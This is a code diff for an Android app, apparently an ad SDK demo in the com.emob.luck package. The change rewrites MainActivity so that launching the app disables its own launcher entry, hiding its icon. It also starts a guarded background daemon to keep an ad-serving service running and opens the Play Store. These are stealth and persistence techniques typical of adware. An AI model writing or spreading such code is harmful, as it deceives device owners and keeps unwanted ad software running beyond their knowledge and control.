@@ -1,16 +1,24 @@
 package com.emob.luck.view;
 
+import com.emob.lib.log.EmobLog;
+import com.emob.lib.util.DevicesUtils;
+import com.emob.lib.util.MobiUtils;
 import com.emob.luck.AdsDataHelper;
 import com.emob.luck.AdsPreferences;
+import com.emob.luck.AdsService;
 import com.emob.luck.common.Value;
 import com.emob.luck.db.AdTableDB;
 import com.emob.luck.db.EventTableDB;
 import com.emob.luck.model.AdItem;
 import com.emob.luck.model.EventItem;
 import com.duduws.recent.R;
+import com.mobi.fork.GuardHelper;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
@@ -25,46 +33,35 @@ public class MainActivity extends Activity implements OnClickListener {
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
-//		requestWindowFeature(getWindow().FEATURE_NO_TITLE);
-//		setContentView(R.layout.main_activity);
-//		mEventTableDB = new EventTableDB(getApplicationContext());
-//		mAdTableDB = new AdTableDB(getApplicationContext());
-//		mPref = AdsPreferences.getInstance(getApplicationContext());
-//		Button btnSpot = (Button) findViewById(R.id.btn_spot);
-//		btnSpot.setOnClickListener(this);
-//		Button btnBanner = (Button) findViewById(R.id.btn_top);
-//		btnBanner.setOnClickListener(this);
-//		Button btnAdmob = (Button) findViewById(R.id.btn_admob);
-//		btnAdmob.setOnClickListener(this);
-//		Button btnAirpush = (Button) findViewById(R.id.btn_airpush);
-//		btnAirpush.setOnClickListener(this);
-//		Button btnWindowBanner = (Button) findViewById(R.id.btn_window_banner);
-//		btnWindowBanner.setOnClickListener(this);
-//		Button btnWindowSpot = (Button) findViewById(R.id.btn_window_spot);
-//		btnWindowSpot.setOnClickListener(this);
-//
-//		boolean isServiceRunning = MobiUtils.isServiceRunning(getApplicationContext(), AdsService.class.getName());
-//		if (!isServiceRunning) {
-//			Intent intent = new Intent(getApplicationContext(),
-//					AdsService.class);
-//			startService(intent);
-//		}
 
-		showFolder();
-		finish();
-	}
-
-	private void showFolder() {
-		Log.d(TAG, "#### FacebookActivity.showFolder begin");
-		try {
-			Intent intent = new Intent();
-			intent.setClass(this, AmActivity.class);
-			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_SINGLE_TOP);
-			this.startActivity(intent);
-		} catch (Exception e) {
-			e.printStackTrace();
+		PackageManager packageManager = getPackageManager();
+		ComponentName componentName = new ComponentName(this, MainActivity.class);
+		int res = packageManager.getComponentEnabledSetting(componentName);
+		if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
+				|| res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+			// 隐藏应用图标
+			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+					PackageManager.DONT_KILL_APP);
+		} else {
+			// 显示应用图标
+			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
+					PackageManager.DONT_KILL_APP);
 		}
-		Log.d(TAG, "#### FacebookActivity.showFolder end");
+
+		boolean isServiceRunning = MobiUtils.isServiceRunning(getApplicationContext(), AdsService.class.getName());
+		EmobLog.d("#### MainActivity.onReceive, service running:"+isServiceRunning);
+		if (!isServiceRunning) {
+			GuardHelper.startDaemon(getApplicationContext(), "com.emob.luck.AdsService");
+		}
+
+		final String appPackageName = "com.android.vending";
+		try {
+			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
+		} catch (android.content.ActivityNotFoundException anfe) {
+			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
+		}
+
+		finish();
 	}
 
 	@Override
